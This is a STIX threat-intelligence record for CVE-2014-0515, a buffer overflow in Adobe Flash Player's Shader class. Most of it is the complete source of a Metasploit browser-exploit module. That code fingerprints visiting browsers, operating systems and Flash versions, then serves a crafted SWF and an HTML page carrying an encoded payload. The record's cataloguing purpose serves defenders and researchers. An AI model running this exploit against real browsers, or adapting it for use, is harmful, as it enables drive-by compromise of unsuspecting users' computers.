{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ebb4cd32-27fa-4c91-b9ab-ea68e6a4fdb0",
    "created": "2024-08-14T17:06:05.552239Z",
    "modified": "2024-08-14T17:06:05.552243Z",
    "name": "Adobe Flash Player Shader Buffer Overflow",
    "description": " This module exploits a buffer overflow vulnerability in Adobe Flash Player. The vulnerability occurs in the flash.Display.Shader class, when setting specially crafted data as its bytecode, as exploited in the wild in April 2014. This module has been tested successfully on the following operating systems and Flash versions:  Windows 7 SP1, IE 8 to IE 11 with Flash 13.0.0.182 Windows 7 SP1, Firefox 38.0.5, Flash 11.7.700.275 and Adobe Flash 13.0.0.182 Windows 8.1, Firefox 38.0.5 and Adobe Flash 13.0.0.182 Linux Mint \"Rebecca\" (32 bit), Firefox 33.0 and Adobe Flash 11.2.202.350  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/adobe_flash_pixel_bender_bof.rb",
            "external_id": "adobe_flash_pixel_bender_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0515"
        },
        {
            "source_name": "reference",
            "url": "http://helpx.adobe.com/security/products/flash-player/apsb14-13.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.securelist.com/en/blog/8212/New_Flash_Player_0_day_CVE_2014_0515_used_in_watering_hole_attacks"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2014-0515-the-recent-flash-zero-day/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Adobe Flash Player Shader Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a buffer overflow vulnerability in Adobe Flash Player. The\n        vulnerability occurs in the flash.Display.Shader class, when setting specially\n        crafted data as its bytecode, as exploited in the wild in April 2014. This module\n        has been tested successfully on the following operating systems and Flash versions:\n\n        Windows 7 SP1, IE 8 to IE 11 with Flash 13.0.0.182,\n        Windows 7 SP1, Firefox 38.0.5, Flash 11.7.700.275 and Adobe Flash 13.0.0.182,\n        Windows 8.1, Firefox 38.0.5 and Adobe Flash 13.0.0.182,\n        Linux Mint \"Rebecca\" (32 bit), Firefox 33.0 and Adobe Flash 11.2.202.350\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability discovery and exploit in the wild\n          'juan vazquez' # msf module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-0515'],\n          ['BID', '67092'],\n          ['URL', 'http://helpx.adobe.com/security/products/flash-player/apsb14-13.html'],\n          ['URL', 'http://www.securelist.com/en/blog/8212/New_Flash_Player_0_day_CVE_2014_0515_used_in_watering_hole_attacks'],\n          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2014-0515-the-recent-flash-zero-day/' ]\n        ],\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'            => ['win', 'linux'],\n      'Arch'                => [ARCH_X86],\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :arch    => ARCH_X86,\n          :os_name => lambda do |os|\n            os =~ OperatingSystems::Match::LINUX ||\n              os =~ OperatingSystems::Match::WINDOWS_7 ||\n              os =~ OperatingSystems::Match::WINDOWS_81\n          end,\n          :ua_name => lambda do |ua|\n            case target.name\n            when 'Windows'\n              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF\n            when 'Linux'\n              return true if ua == Msf::HttpClients::FF\n            end\n\n            false\n          end,\n          :flash   => lambda do |ver|\n            case target.name\n            when 'Windows'\n              return true if ver =~ /^11\\./ && Rex::Version.new(ver) <= Rex::Version.new('11.7.700.275')\n              return true if ver =~ /^12\\./\n              return true if ver =~ /^13\\./ && Rex::Version.new(ver) <= Rex::Version.new('13.0.0.182')\n            when 'Linux'\n              return true if ver =~ /^11\\./ && Rex::Version.new(ver) <= Rex::Version.new('11.2.202.350')\n            end\n\n            false\n          end\n        },\n      'Targets' =>\n        [\n          [ 'Windows',\n            {\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux',\n            {\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-04-28',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status('Sending SWF...')\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status('Sending HTML...')\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    target_payload = get_payload(cli, target_info)\n    b64_payload = Rex::Text.encode_base64(target_payload)\n    os_name = target_info[:os_name]\n\n    if target.name =~ /Windows/\n      platform_id = 'win'\n    elsif target.name =~ /Linux/\n      platform_id = 'linux'\n    end\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" />\n    <param name=\"Play\" value=\"true\" />\n    <embed type=\"application/x-shockwave-flash\" width=\"1\" height=\"1\" src=\"<%=swf_random%>\" allowScriptAccess=\"always\" FlashVars=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" Play=\"true\"/>\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2014-0515', 'msf.swf' )\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-28",
    "x_mitre_platforms": [
        "linux"
    ]
}